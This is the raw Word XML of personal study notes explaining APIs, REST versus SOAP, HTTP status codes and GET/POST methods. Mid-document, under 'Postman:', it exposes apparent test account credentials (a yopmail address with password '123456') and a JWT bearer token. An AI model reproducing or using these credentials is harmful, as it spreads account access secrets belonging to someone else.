    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>2) How is it used?</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proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>According to the rules specified in the contract.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> The whole point of an API is to define how it's used.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>3) When and where is it used?</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It's used when 2 or more separate systems need to work together to achieve something they can't do alone.</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API stands for Application Programming Interface, i.e. API is the way for an application to interact with certain system/application/library/etc.</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For example, there are API's for OS (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>WinAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>), API's for other applications (like databases) and for specific libraries (for example, image processing), etc.</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APIs are usually developed in a form consumable by a client application. For C/C++ applications, it a set header files and dynamic/static libraries. For Java - set of jars. And so on.</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shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>In layman's terms, I've always said an API is like a translator between two people who speak different languages. In software, data can be consumed or distributed using an API (or translator) so that two different kinds of software can communicate. Good software has a strong translator (API) that follows rules and protocols for security and data cleanliness.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Arial" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Where it is used</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 xml:space="preserve">An example, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>You</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> are buying an item in online through your credit card. You will provide credit card details and press continue button. It will tell you whether your information is correct or not. To provide these results, there </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>are lot</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> of things in the background.</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The application will send your credit card details to a remote application which will validate your information and send the result back your application. API is used in this scenario.</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I think hope it helps for the beginners who doesn't understand really what API is.</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Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>With an API, the exact structure of request and response is documented upfront by</w:t>
      </w:r>
      <w:hyperlink r:id="rId185" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
            <w:color w:val="2B6DAD"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>weather.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>, and is likely to remain constant, regardless of whether the website changes its look and feel for human visitors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00860BAB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="600" w:lineRule="atLeast"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00860BAB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00860BAB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">REST means </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>REpresentational</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> State Transfer; it is an architecture that generally runs over HTTP. The REST style emphasizes the interactions between clients and services, which are enhanced by having a limited number of operations. REST is an alternative to SOAP (Simple Object Access Protocol) and instead of using XML for request REST uses </w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>simple URL in some cases. Unlike SOAP, RESTFUL applications uses HTTP build in headers to carry meta-information.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00860BAB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">There are various code that REST use to determine whether user has access to API or not like code 200 or 201 indicates successful interaction with response body while 400 indicates a bad request or the request URI does not match the APIs in the system. All API request parameters and method parameters can be sent via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>either</w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>variables.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00860BAB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00860BAB" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="225" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Rest API supports both XML and JSON format. It is usually preferred for</w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId186" w:tooltip="Mobile" w:history="1">
        <w:r w:rsidRPr="00860BAB">
          <w:rPr>
            <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
            <w:color w:val="70BDCD"/>
            <w:sz w:val="26"/>
          </w:rPr>
          <w:t>mobile</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00860BAB">
        <w:rPr>
          <w:rFonts w:ascii="Droid Sans" w:eastAsia="Times New Roman" w:hAnsi="Droid Sans" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>and web apps as it makes app work faster and smoother</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:t>Postman:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>deepakapi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> / Deepak</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00B84F48" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:hyperlink r:id="rId187" w:history="1">
        <w:r w:rsidR="00267DFA" w:rsidRPr="005F4510">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>my.request.1@yopmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00267DFA">
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r w:rsidR="00267DFA" w:rsidRPr="00722F17">
        <w:t>123456</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE7288">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
        <w:t>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.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.RHK4FAAMk3kIWtZpuKPcROIihQm1KgqVOlFOKSH71Jo</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00745F12">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="red"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
        <w:t>POST data in table</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C40F95">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="268BD2"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FEFBF3"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
      <w:r w:rsidRPr="00C40F95">
        <w:t>Bearer {eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOnsiaWQiOiI5NSIsImVtYWlsIjoibXku</w:t>
      </w:r>
      <w:r w:rsidRPr="00C40F95">
        <w:lastRenderedPageBreak/>
        <w:t>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.RHK4FAAMk3kIWtZpuKPcROIihQm1KgqVOlFOKSH71Jo}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="264" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Trebuchet MS" w:hAnsi="Trebuchet MS"/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Methods of Sending Information to Server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="3C3C3C"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>A web browser communicates with the server typically using one of the two HTTP (Hypertext Transfer Protocol) methods — GET and POST. Both methods pass the information differently and have different advantages and disadvantages, as described below.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="005D17A7" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
